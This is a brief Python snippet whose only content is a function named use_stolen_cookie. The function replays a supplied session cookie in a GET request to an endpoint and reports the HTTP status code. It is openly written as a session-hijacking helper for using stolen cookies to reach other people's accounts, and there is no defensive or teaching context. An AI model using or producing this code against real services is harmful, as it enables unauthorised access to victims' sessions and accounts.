import requests

def use_stolen_cookie(endpoint, cookie_value):
    try:
        r = requests.get(endpoint, cookies={"session": cookie_value}, timeout=5)
        return f"{endpoint} - {r.status_code}"
    except Exception as e:
        return f"Error: {e}"
